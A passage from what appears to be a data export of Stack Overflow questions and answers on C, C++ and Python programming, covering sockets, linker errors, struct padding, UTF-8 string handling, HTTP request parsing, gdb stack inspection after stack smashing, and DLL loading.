                            /* I want to thread the handler function over here! */
                            Handler(ClientSocket, ADDR);
                        }
                    }
                }
            }
</code></pre>

<p>I'm using win7, and set the socket with winsock.</p>
","9530","","<p>The problem is that the compiler is resolving the <code>bind</code> symbol to the C++ function <a href=""http://en.cppreference.com/w/cpp/utility/functional/bind"" rel=""nofollow""><code>std::bind()</code></a> instead of the WinSock function <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms737550%28v=vs.85%29.aspx"" rel=""nofollow""><code>bind()</code></a>.  In order to fix this, you can do one of two things:</p>

<ol>
<li>Remove all <code>using namespace std;</code> declarations in your source file; or</li>
<li><p>Use the scope resolution operator <code>::</code> to explicitly refer to the <code>bind</code> function in the global namespace:</p>

<pre><code>ListenResult = ::bind(...);
</code></pre></li>
</ol>
"
"<p>is there a way to call an external program inside python and don't wait for its execution to finish?</p>

<p>I tried this, but no luck:</p>

<pre><code>os.system(""external_program &amp;"")
</code></pre>

<p>Normally, if I call <code>external_program &amp;</code> inside a bash shell it executes as a background process.
How can I do it inside python? For, my special case, creating another thread does not work. After main python scrip is done, the external program should continue its execution.</p>
","9530","","<p>Yes, use the <a href=""http://docs.python.org/2/library/subprocess.html"" rel=""nofollow""><code>subprocess</code> module</a>.  For example:</p>

<pre><code>p = subprocess.Popen(['external_program', 'arg1', 'arg2'])
# Process is now running in the background, do other stuff...
...
# Check if process has completed
if p.poll() is not None:
    ...
...
# Wait for process to complete
p.wait()
</code></pre>
"
"<pre><code>.data
  ENTRY(sys_call_table)
    .long SYMBOL_NAME(sys_ni_call)           /* 0 */
    .long SYMBOL_NAME(sys_exit)
    .long SYMBOL_NAME(sys_fork)
    ...
    .long SYMBOL_NAME(sys_vfork)             /* 190 */
</code></pre>

<p>I read this source code. I can't find <code>.data</code> or <code>.long</code> definition in the source. </p>
","9530","","<p>They are <a href=""http://sourceware.org/binutils/docs-2.23.1/as/Pseudo-Ops.html#Pseudo-Ops"" rel=""nofollow"">assembler directives</a>—special directions to the assembler which tell it to do something different, rather than inserting a processor instruction into the compiled machine code.</p>

<p>The <a href=""http://sourceware.org/binutils/docs-2.23.1/as/Data.html#Data"" rel=""nofollow""><code>.data</code> directive</a> tells the assembler to emit the following instructions onto the end of one of the subsections of the <code>data</code> section of the executable.  Normally, machine code is emitted into the so-called <code>text</code> section of executables, whereas non-executable data such as global variables are stored in one of the so-called <code>data</code> sections.  The different sections have different memory permissions at runtime, among other features.</p>

<p>The <code>.long</code> directive is equivalent to the <a href=""http://sourceware.org/binutils/docs-2.23.1/as/Int.html#Int"" rel=""nofollow""><code>.int</code> directive</a>, which just says to insert a literal numeric value into the machine code.  So <code>.long SYMBOL_NAME(sys_ni_call)</code> inserts the numeric value of the location of the <code>sys_ni_call</code> symbol.</p>

<p>So putting these together, a <code>.data</code> directive followed by a <code>.long</code> directive results in the assembler putting specific integer values into one of the <code>data</code> sections of the resulting object code.  These values will be non-executable, and they may be read-only or read-write, depending on how the permissions of the <code>sys_call_table</code> subsection of the <code>data</code> section are configured.</p>
"
"<p>I'm trying to learn how to work with external class files in C++ and have hit a wall. Everything runs just spiffy in xcode, but when trying to run it in the command line I've gotten the following error.</p>

<p><strong>From g++:</strong></p>

<p>Undefined symbols for architecture x86_64:
  ""GradeBook::GradeBook(std::basic_string, std::allocator >)"", referenced from:
      _main in cc9lOO3b.o
  ""GradeBook::getCourseName() const"", referenced from:
      _main in cc9lOO3b.o
ld: symbol(s) not found for architecture x86_64
collect2: ld returned 1 exit status</p>

<p><strong>Here's the source code for the class:</strong></p>

<pre><code>// GradeBook.h header file


#include &lt;iostream&gt;
#include ""GradeBook.h"" // include definition of class GradeBook

// constructor initializes couseName with string supplied as argument
GradeBook::GradeBook ( std::string name )
: courseName ( name ) // member initializer to initialize courseName
{
    // empty body
} // end GradeBook constructor

// function that sets the course name
void GradeBook::setCourseName ( std::string name )
{
    courseName = name; // store the course name in the objec
} // end function setCourseName

// function that gets the course name
std::string GradeBook::getCourseName() const
{
    return courseName; // returns the object's courseName
} // end function getCourseName

// function that displays a welcome message to the GradeBook user
void GradeBook::displayMessage() const
{
    // this statement calls getCourseName to get the
    // name of the course this Gradebook represents
    std::cout &lt;&lt; ""Welcome to the grade book for\n"" &lt;&lt; getCourseName() &lt;&lt; ""!"" &lt;&lt; std::endl;
} // end function displayMessage
</code></pre>

<p>Thanks for taking a look!</p>
","9530","","<p>You can't just compile one source file, you need to compile them all.  The simplest way is to pass all of the source files on the command line to <code>g++</code>:</p>

<pre><code>g++ main.cpp GradeBook.cpp # Other flags (e.g. ""-o OutputFile"", ""-Wall"", etc.)
</code></pre>

<p>If you only compile <code>main.cpp</code>, you'll see errors about undefined symbols for any symbols which would be defined in <code>GradeBook.cpp</code>, such as the <code>GradeBook::GradeBook()</code> constructor.  Conversely, if you only compile <code>GradeBook.cpp</code>, you'll see errors about undefined symbols for any symbols which are defined in <code>main.cpp</code>, namely the <code>main()</code> function.</p>

<p>This command line recompiles every source file every time you run it.  For small projects like this, that is fine, since you won't notice the compile time, but as your project grows, you'll find it much more convenient to only recompile files which have changed or include headers which have changed.  You'd typically use a dependency tracker such as GNU Make for this.  After doing the dependency analysis, it will recompile source files one at a time like this:</p>

<pre><code>g++ main.cpp -c -o main.o $(CXXFLAGS)  # Compile main.cpp
g++ GradeBook.cpp -c -o GradeBook.o $(CXXFLAGS)  # Compile GradeBook.cpp

g++ main.o GradeBook.o $(LDFLAGS)  # Link two object files into executable
</code></pre>

<p>You can also do this manually, of course, but it's much simpler just to pass all of the source files to <code>g++</code> at once, and it can do the compiling and linking all together.</p>

<p>And as Luchian Grigore mentioned, you do need to <code>#include &lt;string&gt;</code> in your source files in order to use the <code>std::string</code> class.  Ordinarily, failure to do so would result in compiler errors, but your C++ standard library implementation just happens to <code>#include &lt;string&gt;</code> from inside <code>&lt;iostream&gt;</code>.  You should not rely on this behavior—if you port your code to other platforms, it may very well fail to compile, so it's better to avoid that in the first place.  But even if compiles successfully without that include, that wouldn't ever lead to the linker errors you're getting.</p>
"
"<p>I am trying to open the URL to parse for content using the following code. but I receive a 403 error when i try through python and not while using the same URL through a web browser. any help to overcome this?</p>

<pre><code>import urllib2
URL = 'http://www.google.com/search?q=something%20unusual'
response = urllib2.urlopen(URL)
</code></pre>

<p><strong>Response from Py Interpreter: HTTPError: HTTP Error 403: Forbidden</strong></p>
","9530","","<p>Google is using User-Agent filtering to prevent bots from interacting with its search service.  You can observe this by comparing these results with <code>curl(1)</code> and optionally using the <code>-A</code> flag to change the User-Agent string:</p>

<pre><code>$ curl -I 'http://www.google.com/search?q=something%20unusual'
HTTP/1.1 403 Forbidden
...

$ curl -I 'http://www.google.com/search?q=something%20unusual' -A 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0'
HTTP/1.1 200 OK
</code></pre>

<p>You should probably instead be using the <a href=""https://developers.google.com/custom-search/v1/overview"" rel=""nofollow"">Google Custom Search</a> service to automate Google searches.  Alternatively, you could set your own User-Agent header with the <code>urllib2</code> library (instead of the default of something like <code>""Python-urllib/2.6""</code>), but this may contravene Google's terms of service.</p>
"
"<p>hi every body i have a problem in language C and i can't fix it here is my code : </p>

<pre><code>void demande_usine_stockage(entrepot *u_s,fournisseur f[],int *demande,delai_appro &amp;d_a,delai_ass &amp;d_ass,usine_ass *u_a,int *attente_stockage,int *attente_assemblage,int *debut_stockage,int *fin_stockage,int *debut_assemblage,int *fin_assemblage,int periode)
{
 u_a-&gt;commande_en_souffrance += *demande;
 u_a-&gt;niveau_stock=u_a-&gt;stock_physique - u_a-&gt;commande_en_souffrance;
if (u_a-&gt;niveau_stock &gt;= *demande)
 {
       *debut_stockage=periode;
       *fin_stockage=periode+u_a-&gt;L_assemblage;
       stockage(u_s,demande,d_a,u_a,debut_stockage,fin_stockage,attente_stockage,periode);
 }
 else
 {
     *debut_stockage=periode+f[1].L;
     *fin_stockage=(periode+u_a-&gt;L_assemblage+f[1].L);
     stockage(u_s,demande,d_a,u_a,debut_stockage,fin_stockage,attente_stockage,periode);
     demande_usine_assemblage(f,u_a,d_ass,demande,attente_assemblage,debut_assemblage,fin_assemblage,periode);
 }
}
</code></pre>

<p>and délai_ass is a linked list<br>
here is the error</p>

<p><code>430 G:\test1.cpp invalid initialization of reference of type 'delai_assemblage*&amp;' from expression of type 'delai_assemblage'</code></p>
","9530","","<p>If this is really C, not C++, then rename your file to have a <code>.c</code> extension, not <code>.cpp</code>.  C and C++ are two different languages, and you should not be compiling <code>.cpp</code> files as C code.</p>

<p>You'll also need to remove all reference types (types with a <code>&amp;</code> in them, before the identifier), since C does not have references.  For example:</p>

<pre><code>void demande_usine_stockage(
    entrepot *u_s,
    fournisseur f[],
    int *demande,
    delai_appro *d_a,  // Reference (&amp;) changed to pointer (*)
    delai_ass *d_ass,  // Reference (&amp;) changed to pointer (*)
    usine_ass *u_a,
    int *attente_stockage,
    int *attente_assemblage,
    int *debut_stockage,
    int *fin_stockage,
    int *debut_assemblage,
    int *fin_assemblage,
    int periode)
{
    ...
}
</code></pre>
"
"<p>My program seems to run for a short time before crashing with the following error: </p>

<pre><code>Unhandled exception at 0x001FFF23 in Program.exe: 0xC0000005: 
Access violation reading location 0x040FA010.
</code></pre>

<p>The call stack is very unhelpful (Source information is missing from the debug information for this module), so I have no idea where the problem is. The program runs normally for a varying amount of time before crashing (several hundred frames), so locating the problem using breakpoints is very difficult. Tried loading symbols but no symbols were found.</p>

<pre><code>ntdll.dll!_NtRaiseException@12()   Unknown
ntdll.dll!_KiUserExceptionDispatcher@8()   Unknown
0027ff23()  Unknown
[Frames below may be incorrect and/or missing]  
nvoglv32.dll!582c9af4() Unknown
nvoglv32.dll!582c9dbb() Unknown
nvoglv32.dll!582cdbd3() Unknown
nvoglv32.dll!582d0918() Unknown
nvoglv32.dll!57a9491b() Unknown
nvoglv32.dll!580c5f35() Unknown
KernelBase.dll!_GlobalAlloc@8()    Unknown
nvoglv32.dll!57a058a5() Unknown
nvoglv32.dll!579f60ab() Unknown
nvoglv32.dll!582df7ce() Unknown
nvoglv32.dll!57a106e5() Unknown
nvoglv32.dll!58190f2d() Unknown
nvoglv32.dll!582bb8c7() Unknown
nvoglv32.dll!57a0b621() Unknown
nvoglv32.dll!5823285b() Unknown
nvoglv32.dll!58232a9d() Unknown
KernelBase.dll!_HeapCreate@12()    Unknown
ntdll.dll!_NtFreeVirtualMemory@16()    Unknown
KernelBase.dll!_GlobalFree@4() Unknown
</code></pre>

<p>Looking at the callstack I presume it is something OpenGL related, however glGetError() never indicates a problem. My program is rather long, so I did not post it here. Besides, my problem is not fixing just this particular exception, but finding an efficient way to debug them in the future. Reading through the entire program line by line is not one, as I have no idea in which function the problem occurs. No compiler warnings with /W3, so I have no idea where to begin. How can I find out where an exception exactly occurs in Visual Studio 2012 Ultimate?</p>
","9530","","<p>Use the <a href=""http://support.microsoft.com/kb/311503"" rel=""nofollow"">Microsoft Symbol Servers</a> to download the symbols for the Windows DLLs.  This will hopefully give you a much better idea of where the error is occurring.  To use the symbol servers with Visual Studio, follow <a href=""http://msdn.microsoft.com/en-us/library/b8ttk8zy%28v=vs.100%29.aspx"" rel=""nofollow"">these instructions</a>.</p>
"
"<p>My problem is that I have a thread that is in a recv() call. The remote host suddenly terminates (without a close() socket call) and the recv() call continues to block. This is obviously not good because when I am joining the threads to close the process (locally) this thread will never exit because it is waiting on a recv that will never come.</p>

<p>So my question is what method do people generally consider to be the best way to deal with this issue? There are some additional things of note that should be known before answering:</p>

<ul>
<li><p>There is no way for me to ensure that the remote host closes the socket prior to exit.</p></li>
<li><p>This solution cannot use external libraries (such as boost). It must use standard libraries/features of C++/C (preferably not C++0x specific). </p></li>
</ul>

<p>I know this has likely been asked in the past but id like to get someones take as to how to correct this issue properly (without doing something super hacky which I would have done in the past).</p>

<p>Thanks!</p>
","9530","","<p>You can use TCP keep-alive probes to detect if the remote host is still reachable.  When keep-alive is enabled, the OS will send probes if the connection has been idle for too long; if the remote host doesn't respond to the probes, then the connection is closed.</p>

<p>On Linux, you can enable keep-alive probes by setting the <code>SO_KEEPALIVE</code> socket option, and you can configure the parameters of the keep-alive with the <code>TCP_KEEPCNT</code>, <code>TCP_KEEPIDLE</code>, and <code>TCP_KEEPINTVL</code> socket options.  See <a href=""http://linux.die.net/man/7/tcp"" rel=""nofollow""><code>tcp(7)</code></a> and <a href=""http://linux.die.net/man/7/socket"" rel=""nofollow""><code>socket(7)</code></a> for more info on those.</p>

<p>Windows also uses the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ee470551%28v=vs.85%29.aspx"" rel=""nofollow""><code>SO_KEEPALIVE</code></a> socket option for enabling keep-alive probes, but for configuring the keep-alive parameters, use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd877220%28v=vs.85%29.aspx"" rel=""nofollow""><code>SIO_KEEPALIVE_VALS</code> ioctl</a>.</p>
"
"<p>I have the following code. The file contains a bitmap image were the first bytes are 0x424d. I would expect the first printf to print BM, instead it prints BM??.</p>

<p>Additionally, the second printf prints 10, and I would expect it to be a larger number since the file is larger then 10 bytes.</p>

<pre><code>fp = fopen(""input.bmp"", ""r"");
bmp_header_p = malloc(sizeof(bmp_header_t));

rewind(fp);
fread(bmp_header_p, sizeof(char), 14, fp);

printf(""magic number = %s\n"", bmp_header_p-&gt;magic);
printf(""file size = %"" PRIu32 ""\n"", bmp_header_p-&gt;filesz);

typedef struct {
uint8_t magic[2];   /* the magic number used to identify the BMP file:
                     0x42 0x4D (Hex code points for B and M).
                     The following entries are possible:
                     BM - Windows 3.1x, 95, NT, ... etc
                     BA - OS/2 Bitmap Array
                     CI - OS/2 Color Icon
                     CP - OS/2 Color Pointer
                     IC - OS/2 Icon
                     PT - OS/2 Pointer. */
uint32_t filesz;    /* the size of the BMP file in bytes */
                     of the byte where the bitmap data can be found. */
} bmp_header_t;
</code></pre>
","9530","","<p>You have several problems:</p>

<ol>
<li>The compiler is likely adding padding into your data structure between the <code>magic</code> and <code>filesz</code> members.  There are compiler-specific extensions such as pragmas and attributes you can use to avoid this behavior and get packed structures (<a href=""http://msdn.microsoft.com/en-us/library/2e70t5y1%28v=vs.80%29.aspx"" rel=""nofollow"">Visual Studio</a>, <a href=""http://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Type-Attributes.html"" rel=""nofollow"">GCC</a>).  But these are not portable and should be avoided if possible.</li>
<li>The <code>%s</code> format specifier expects a null-terminated string, but the string you're passing is not terminated.  You should instead use a specifier such as <code>%.2s</code> to print at most 2 characters.</li>
<li>The bitmap file format is little-endian.  If your computer is also little-endian, then it will appear to work correctly, but when you compile for a big-endian architecture, you'll find it will suddenly stop working.  You must endian-swap any multibyte values like <code>filesz</code> on big-endian platforms.</li>
<li>The call to <code>rewind(3)</code> is not necessary—the file pointer is guaranteed to be at the start of the file after you open it.</li>
</ol>

<p>There are many ways to solve problem (1); there are countless articles and answers about how to do serialization correctly in C.  I'd recommend just reading each member individually so that you don't have to worry about how the compiler lays out your structure, and it will be fully portable to all platforms.</p>

<p>Also, <code>sizeof(char)</code> is guaranteed to be 1 by the C standard, so there's rarely a need to explicitly write out <code>sizeof(char)</code> in e.g. function arguments to <code>fread(3)</code>.</p>
"
"<p>I've below piece of code :</p>

<pre><code>float i=85.00;
printf(""%f %p"",i,i);
</code></pre>

<p>which prints o/p:</p>

<pre><code>85.00000 (nil)
</code></pre>

<p>But when I change the order like below:</p>

<pre><code>    float i=85.00;
    printf(""%p %f"",i,i);
</code></pre>

<p>the o/p is :</p>

<pre><code>(nil) 0.00000
</code></pre>

<p>While I expect that similar o/p should be printed as earlier, in mentioned order.
What is the behaviour going on can anyone please explain?</p>
","9530","","<p>What you're doing is <strong>undefined behavior</strong>.  The <code>%p</code> format specifier promises that you're passing in a pointer (specifically a <code>void*</code> pointer), and you're passing in a <code>double</code> instead (<code>float</code> values get promoted to <code>double</code> when passed to variadic functions such as <code>printf</code>).  So as soon as you fail to satisfy the requirements, the compiler and implementation are free to do whatever they want, and printing out 0 instead of 85 in the second case is perfectly legal.</p>

<p>What's likely happening is that the compiler is using a calling convention which places floating-point values in separate registers (e.g. the x87 floating-point stack, or the SSE2 SIMD registers) instead of on the stack, whereas integer values like pointers get passed on the stack.  So when the implementation sees a <code>%p</code> format specifier, it tries to read the argument off of the stack, when in fact the argument is actually elsewhere.</p>

<p>As others have mentioned, you should really be compiling with the <code>-Wall</code> option (assuming GCC or a GCC-compatible compiler).  It will help you catch these kinds of errors.</p>
"
"<p>I am using gcc 4.5 to compile a Linux kernel module. I just noticed that I have some code that looks like this:</p>

<pre><code>#define NODE_ID      ""string_here""

int foot(int a) {
    /* snip */
    NODE_ID;
    NODE_ID;
    /* snip */
    return 0;
}
</code></pre>

<p>I have these two no-effect statements, and the compiler never generates a warning telling me about them. Why is this? I wonder if there's other statements like this floating in my project that I haven't found.</p>
","9530","","<p>It does warn you, you just weren't listening -- as @Mat said in the comments, you need to enable the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html"" rel=""nofollow""><code>-Wall</code> option</a>, and it will warn you:</p>

<pre><code>$ gcc test.c -c -Wall
test.c: In function ‘foot’:
test.c:5:5: warning: statement with no effect
test.c:6:5: warning: statement with no effect
</code></pre>

<p>Or, you can just enable the <code>-Wunused-value</code> option for just this warning, but I highly recommend using <code>-Wall</code>, which includes this and many other useful warnings.  You can also enable <code>-Wextra</code> and <code>-pedantic</code> for even more, but these sometimes give false positives for code which is perfectly fine, adding extra noise to your build process.  So use them judiciously.</p>
"
"<p>I have a problem with <code>string</code> manipulation, first consider these <code>string</code>s :</p>

<pre><code>string s1 = ""Graveworm"";
string s2 = ""Motörhead""; //the best of the best, just to say...
</code></pre>

<p>as you can see, each of them have 9 <code>char</code>s, yes.. but no... because when I <code>pop_back()</code> a letter with accent like ""é"" I have to <code>pop_back()</code> two <code>char</code>s.</p>

<p>so now, there is a way to know how many <code>char</code>(s) I have to <code>pop_back()</code>, remember that <code>s1</code> and <code>s2</code> are written in the code.</p>

<p>note :: while writing this question, a possible method come in my mind : get the size of the string and delete char by char as long as the size hasn't decrease of one;
well, I tried this :</p>

<pre><code>if(s-&gt;size()&gt;0){
         int size = s-&gt;size();
         for(i=size; i &gt; size-1 ;i--){
           s-&gt;pop_back();
         }
</code></pre>

<p>not working as expected</p>
","9530","","<p>Most Linux distros use the <a href=""http://en.wikipedia.org/wiki/UTF-8"" rel=""nofollow"">UTF-8</a> encoding for non-ASCII characters.  UTF-8 has the property that all non-initial bytes have a bit pattern of <code>10xxxxxx</code>, so one way you can pop an entire UTF-8 character would be like so:</p>

<pre><code>// Note: How this gets compiled depends on your compiler's input character set.
// For GCC, see the -finput-charset and -fexec-charset compiler options.
std::string s = ""Motörhead"";

while (s.size() &gt; 0)
{
    char c = s.back();
    s.pop_back();

    // If we found an initial character, we're done
    if ((c &amp; 0xC0) != 0x80)
        break;
}
</code></pre>

<p>This works by popping characters until we find an initial character (one with an initial bit pattern of <code>0xxxxxxx</code> or <code>11xxxxxx</code>).  It also has a safety net to bail out and avoid Undefined Behavior if somehow the string you have is malformed and isn't actually valid UTF-8.</p>

<p>Keep in mind, though, that this code makes assumptions about its target environment.  If you run this in any non-UTF-8 environments, you'll need to make sure that your strings are converted to UTF-8 before using this code and that they're converted back into the target environment's encoding before being output (e.g. printed to the console).  If you fail to do so, it will fail in surprising ways (frequently with some type of <a href=""http://en.wikipedia.org/wiki/Mojibake"" rel=""nofollow"">mojibake</a>).</p>
"
"<p>I can't find an example of encrypting a string with ""SHA-512"" in C.
Can someone help me with some code or a link.
Thank you in advance.</p>
","9530","","<p>SHA-512 is not an encryption algorithm, it is a <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash""><em>cryptographic hash</em></a>, which is completely different.</p>

<p>One library you can use to perform SHA hashes is <a href=""http://www.openssl.org/"">OpenSSL</a>.  Here's an example of computing the raw SHA-512 hash of some data with OpenSSL:</p>

<pre><code>#include &lt;openssl/sha.h&gt;
...
char data[] = ""data to hash"";
char hash[SHA512_DIGEST_LENGTH];
SHA512(data, sizeof(data), hash);

// 'hash' now contains the raw 64-byte binary hash.  If you want to print it out
// in a human-readable format, you'll need to convert it to hex, e.g.
</code></pre>
"
"<p>I'm creating a simple HTTP server, that needs to understand HTTP requests, </p>

<p>But browsers like chromium utilizes HTTP Pipelining technology, which means in a single connection multiple HTTP request can be sent.</p>

<p>Now I find it hard to tell the boundary between multiple HTTP request, one obvious example is that a GET request plus a form upload of random data.</p>

<p>What I think of right now, is split all the data I received with <code>\r\n</code>, then check every line, see if it looks like a HTTP request, e.g <code>^(GET|PUT|HEAD|POST|MOVE|TRACE) /[^ ]+ HTTP/[0-9]+\.[0-9]+$</code></p>

<p>But that could still be wrongful, any ideas? 
(Please don't tell me to use an existing HTTP server library ... I'm practicing something)</p>
","9530","","<p>Take a good read through <a href=""http://tools.ietf.org/html/rfc2616"">RFC 2616</a>, the specification for the HTTP protocol.  An HTTP request consists of these pieces:</p>

<ol>
<li>Start line</li>
<li>Zero or more header lines</li>
<li>Empty line</li>
<li>Request body</li>
</ol>

<p>You start by parsing the start line, which involves reading until the first newline (carriage return and linefeed, CRLF).  Then, you read the headers by reading lines until you read an empty line (i.e. two consecutive CRLF pairs).</p>

<p>Once you've read the headers, you can determine if there's a request body or not by seeing if you got a <code>Content-Length</code> and/or <code>Transfer-Encoding</code> header.  If you did get either of those, then those tell you how long the request body is, and then you read that much data (this may require multiple reads, e.g. with the <code>chunked</code> transfer-encoding).</p>

<p>After you've read the request body, you're done!  You're then ready to read the next request.</p>
"
"<p>I compile my programm with gcc and then I run gcc on the a.out file.
When I run the programm inside gdb then, I am getting this error:</p>

<pre><code>Program received signal SIGSEGV, Segmentation fault.
0xbffff118 in ?? ()
(gdb) backtrace
#0  0xbffff118 in ?? ()
#1  0x00000000 in ?? ()
</code></pre>

<p>What does this mean?
Also before i, when is was trying to run the program normally I got this error:</p>

<pre><code>*** stack smashing detected ***: ./benchmark terminated
Aborted (core dumped)
</code></pre>

<p>So i read that this is a protection for buffer overflows, i double checked everything an there should be everything fine so i disabled this using the flag:</p>

<pre><code>-fno-stack-protector
</code></pre>

<p>edit: I am not posting the code since I want to figure out how to use gdb rather than getting just my code working. so I am new to gdb but I used it a couple of times with success now. Still i cannot figure out what ?? means, in what cases can gdb point me not the the corresponding call in my code, that causes the error and why is the address of frame 1 0x0?</p>
","9530","","<p>When you get a junk backtrace like that, it almost certainly means that your stack was smashed somehow, and the actual return addresses and stack frame pointers have been overwritten.</p>

<p>The value <code>0xbffff118</code> is almost certainly an address in your stack.  I believe that on many x86 Linux compilers, the compiler starts the stack at virtual address <code>0xc0000000</code>, and it grows downwards from there, so any addresses starting with <code>0xbfff</code> are very likely stack addresses.</p>

<p>Ordinarily, the instruction pointer should never be inside the stack.  The way that that typically happens is that a value pointing into the stack overwrites a return address stored in the stack, and then when the current function returns, it returns to the overwritten value.  If the stack is non-executable, like it should be, this will raise a signal immediately; if somehow the stack is executable, then it may not crash until several instructions later, unless you're being maliciously exploited, in which case you're going to have a bad time.</p>

<p>Once your stack is smashed, the <code>backtrace</code> command is not going to be useful, as you found out.  The best way to figure out what's going on from there is to manually inspect the stack and search for probably return addresses and frame pointers.  You can use the <code>x</code> command to dump a memory region (run <code>help x</code> for details).  I like to use the <code>x/&lt;NUMBER&gt;wx</code> to dump as 4-byte hex values.  So, here's how to dump a bunch of data starting at the stack pointer <code>$esp</code>:</p>

<pre><code>(gdb) x/64wx $esp
0xbffff7c0: 0x00000073  0xbffff9e9  0x0000000b  0x00000012
0xbffff7d0: 0xbffff9e8  0x0be04aa0  0xbffff7f8  0x000018aa
0xbffff7e0: 0x0be04aa0  0xbffff9e8  0x00000000  0x00000002
0xbffff7f0: 0xbffff9e7  0x09a0bb10  0xbffff818  0x000018aa
0xbffff800: 0x09a0bb10  0xbffff9e7  0x00000002  0x0000000e
0xbffff810: 0xbffff9e6  0x015377f0  0xbffff838  0x000018aa
0xbffff820: 0x015377f0  0xbffff9e6  0x00000008  0x00000011
0xbffff830: 0xbffff9e5  0x01537860  0xbffff858  0x000018aa
0xbffff840: 0x01537860  0xbffff9e5  0x00000003  0x0000000f
0xbffff850: 0xbffff9e4  0x001ddbc0  0xbffff878  0x000018aa
0xbffff860: 0x001ddbc0  0xbffff9e4  0x00000018  0x00000017
0xbffff870: 0xbffff9e3  0x00177c50  0xbffff898  0x000018aa
0xbffff880: 0x00177c50  0xbffff9e3  0xbffff8b8  0x00000000
0xbffff890: 0xbffff9e2  0x00176050  0xbffff8b8  0x000018aa
0xbffff8a0: 0x00176050  0xbffff9e2  0xbffff9e1  0x0000000c
0xbffff8b0: 0xbffff9e1  0x00174920  0xbffffb08  0x00001b8a
</code></pre>

<p>Here, <code>$esp</code> is <code>0xbffff7c0</code>, and <code>$eip</code> is <code>0x00001870</code> (which I got using the <code>p/x $eip</code> command, but it can also be seen with <code>info regs</code> to get all of the registers).  So, every stack frame will be a pointer higher into the stack (<code>0xbfff....</code>) followed by an address similar to <code>0x00001870</code>.  Looking for these in the memory dump, we can be pretty sure that these are stack frames:</p>

<pre><code>0xbffff7f8  0x000018aa
0xbffff818  0x000018aa
0xbffff838  0x000018aa
(etc.)
</code></pre>

<p>This is an example I grabbed from a highly recursive program I had lying around, so that's why the return addresses are all the same.  Once you find a few good stack frames that haven't been smashed, you can just follow the frame pointers yourself:</p>

<pre><code>(gdb) x/2wx 0xbffff7f8
0xbffff7f8: 0xbffff818  0x000018aa
(gdb) x/2wx 0xbffff818
0xbffff818: 0xbffff838  0x000018aa
(gdb) x/2wx 0xbffff838
0xbffff838: 0xbffff858  0x000018aa
(gdb) x/2wx 0xbffff858
0xbffff858: 0xbffff878  0x000018aa
...
</code></pre>

<p>And then if you want to convert instruction addresses into symbol names, you can again use the <code>x</code> command, and if you have debug symbols, gdb will happily print the symbol name:</p>

<pre><code>(gdb) x 0x000018aa
0x18aa &lt;add_word+154&gt;:  0x5d18c483
</code></pre>

<p>That's a quick primer on how to get an actual useful stack trace when your stack has been smashed.  Of course, it's best to avoid this in the first place.  I highly recommend that you compile your code with <code>-Wall -Wextra -Werror</code> (and also <code>-pedantic</code> if you can), and of course don't use <code>-fno-stack-protector</code> unless you have a really, <em>really</em> good reason to do so.</p>
"
"<p>Let's say I produce a new standard API. This API consists of a bunch of C header files, but no implementation. Specific vendors are responsible for implementing my interfaces so that application developers can interact with their products. The reason for having the interface to begin with is simple: the application developer should be able to interact with different products without trouble, since all of the products implement my interface. </p>

<p>Ok. Now onto the hard stuff. How would a vendor who is implementing my API implement the C code? My assumption for this question is that the vendor would simply include my header files in their project and create a .DLL that ""exports"" their implementation functions. More importantly, how would an application developer who wants to interact with my API (but wants it to work with <em>any</em> implementation from any vendor) write their code to take advantage of this? </p>

<p>I read <a href=""http://stackoverflow.com/questions/552248/difference-between-load-time-and-run-time-dynamic-linking"">this SO post</a> about dynamic vs. load time linking. It seems like load time linking is useful if you know the name of the .dll you want to link to and you know the functions you want to call in that .dll. However, in my scenario, wouldn't the application developer have to dynamically link to a .dll that implements the functions from my API? How would this application developer know what the name of the .dll is that implements the functions from my API?</p>

<p>I hope my confusion makes sense. I come from a background where I learned how to program in C, but we did not do much with this stuff. From my recollection, we wrote a bunch of header files and C files, then we compiled it and linked it... and it resulted in an executable with all the code in that one executable. Please help clarify my misconceptions. </p>
","9530","","<blockquote>
  <p>How would this application developer know what the name of the .dll is that implements the functions from my API?</p>
</blockquote>

<p>The easiest solution is to pick a fixed name (e.g. <code>MyInterface.dll</code>) and require all implementers of your interface to name their DLL with that name.  Then, the program can just try to load up a DLL with that name.</p>

<p>If you want more flexibility, then the application needs to be more complicated.  For example, you could specify the DLL name in a configuration file.  The application would then read in your configuration file, get the name of the DLL, load it with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx"" rel=""nofollow""><code>LoadLibrary()</code></a>, and load up any needed functions with <a href=""http://msdn.microsoft.com/en-us/library/ms683212%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetProcAddress()</code></a>.</p>

<p>If you want to be able to load multiple implementations of the same interface at the same time, then obviously they have to have separate filenames.  This is often done by programs which load up DLL plugins.  The usual way of doing this is to enumerate all of the DLLs in a given directory matching a given filename pattern, e.g. with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364418%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindFirstFile()</code></a>/<a href=""http://msdn.microsoft.com/en-us/library/aa364428%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindNextFile()</code></a>.  For each DLL found, again call <code>LoadLibrary()</code> and <code>GetProcAddress()</code> to access the functions within each.</p>
"
"<p>I'm having trouble with generating a build setup that allows shared libraries to be built in both Linux and Windows using gcc and MinGW, respectively.  In Linux, a shared library doesn't have to resolve all dependencies at compile time; whereas, this appears to the case in Windows.  Here is the problem setup:</p>

<hr>

<pre><code>$ cat foo.h 
#ifndef FOO_H
#define FOO_H
void printme();
#endif
</code></pre>

<hr>

<pre><code>$ cat foo.c
#include ""foo.h""
#include &lt;stdio.h&gt;
void printme() {
    printf(""Hello World!\n"");
}
</code></pre>

<hr>

<pre><code>$ cat bar.h
#ifndef BAR_H
#define BAR_H
void printme2();
#endif
</code></pre>

<hr>

<pre><code>$ cat bar.c
#include ""bar.h""
#include ""foo.h""
void printme2() {
    printme();
    printme();
}
</code></pre>

<hr>

<pre><code>$ cat main.c
#include ""bar.h""
int main(){
    printme2();
}
</code></pre>

<hr>

<pre><code>$ cat Makefile 
.c.o:
        gcc -fPIC -c $&lt;

all: foo.o bar.o main.o
        gcc -shared foo.o -o libfoo.so
